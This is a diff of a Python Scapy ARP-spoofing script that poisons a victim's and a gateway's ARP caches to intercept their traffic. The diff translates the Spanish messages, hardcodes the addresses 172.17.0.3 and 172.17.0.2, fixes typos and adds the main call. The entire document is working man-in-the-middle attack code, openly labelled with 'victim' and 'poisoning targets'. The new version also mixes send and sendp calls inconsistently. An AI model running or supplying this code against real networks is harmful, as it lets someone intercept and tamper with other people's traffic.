@@ -6,70 +6,70 @@
 #########     COMO LO QUIERO A MI AMIGO PABLITO CHEWIN      #########
 #####################################################################
 
-from scapy.all import*
+from scapy.all import *
 import sys
 import os
 import time
 
 ## ENTRADA DE DATOS
-try: 
-    interface=input()
-    ipvic=input()
-    Gateway=input()
-
+try:
+    victimIP = "172.17.0.3"
+    gateIP = "172.17.0.2"
 except KeyboardInterrupt:
-    print("\n[*] Exeption Error: User requested Shutdown")
-    print("[**] Exit...")
+    print ("\n[*] User Requested Shutdown")
+    print ("[*] Exiting...")
     sys.exit(1)
-
-print("\n[*] Habilitando el envio de IP...\n")
-os.system("echo1 > /proc/sys/net/ipv4/ip_forward")
+    
+print ("\n[*] Enabling IP Forwarding...\n")
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 ## OBTENEMOS LA MAC DE LA VICTIMA CON UN ARP REQUEST
 def get_mac(IP):
-    conf.verb=0
-    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2,iface=interface,inter=0.1)
+    conf.verb = 0
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = "eth0", inter = 0.1)
     for snd,rcv in ans:
-        return rvc.sprintf(r"%Ether.src%")
+        return rcv.sprintf(r"%Ether.src%")
 
 ## RE-ASIGNANDO LA DIRECCION DEL OBJETIVO (LIMPIANDO LA ESCENA DEL CRIMEN)
-def re_ARP():
-    print("\n[*] Restaurando Objetivos...")
-    VicMAC=get_mac(ipvic)
-    GateMAC=get_mac(Gateway)
-    send(ARP(op=2,pdst=Gateway,psrc=ipvic,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=VicMAC),count=7)
-    send(ARP(op=2,pdst=ipvic,psrc=Gateway,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=GateMAC),count=7)
-    print("\n[*] Deshabilitando el Envio De IP...")
+def reARP():
+    
+    print("\n[*] Restoring Targets...")
+    victimMAC = get_mac("172.17.0.3")
+    gateMAC = get_mac("172.17.0.2")
+    sendp(ARP(op = 2, pdst = "172.17.0.2", psrc = "172.17.0.3", hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+    sendp(ARP(op = 2, pdst = "172.17.0.3", psrc = "172.17.0.2", hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+    print("[*] Disabling IP Forwarding...")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    print("\n[**] Apagando...")
+    print("[*] Shutting Down...")
     sys.exit(1)
 
 ## MANDANDO UN REQUEST ARP A AMBOS OBJETIVOS PARA DECIR QUE YO SOY EL OTRO OBJETIVO (ENGAÑANDO AL SISTEMA)
 def trick(gm, vm):
-    send(ARP(op=2,pdst=ipvic,psrc=Gateway,hwdst=vm))
-    send(ARP(op=2,pdst=Gateway,psrc=ipvic,hwdst=gm))
+    send(ARP(op = 2, pdst = "172.17.0.3", psrc = "172.17.0.2", hwdst= vm))
+    sendp(ARP(op = 1, pdst = "172.17.0.2", psrc = "172.17.0.3", hwdst= gm))
 
 ## FUNCION MAIN
 def mitm():
     try:
-        vicMac=get_mac(ipvic)
+        victimMAC = get_mac("172.17.0.3")
     except Exception:
-            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-            print("\n[!] ERROR: No Se Pudo Encontrar La Direccion MAC De La VICTIMA")
-            print("\n[!] Saliendo...")
-            sys.exit(1)
-    try:
-        GateMAC=get_mac(Gateway)
-    except Exception:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print("\n[!] ERROR: No Se Pudo Encontrar La Direccion MAC De LA PUERTA DE ENLACE")
-        print("\n[!] Saliendo...")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     
+        print("[!] Couldn't Find Victim MAC Address")
+        print("[!] Exiting...")
         sys.exit(1)
-    print("\n[*] Envenenando Objetivos...")
+    try:
+        gateMAC = get_mac("172.17.0.2")
+    except Exception:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     
+        print("[!] Couldn't Find Gateway MAC Address")
+        print("[!] Exiting...")
+        sys.exit(1)
+    print("[*] Poisoning Targets...")
     while 1:
         try:
-            trick(GateMAC, vicMac)
+            trick(gateMAC, victimMAC)
             time.sleep(1.5)
         except KeyboardInterrupt:
-            re_ARP()
+            reARP()
             break
+mitm()
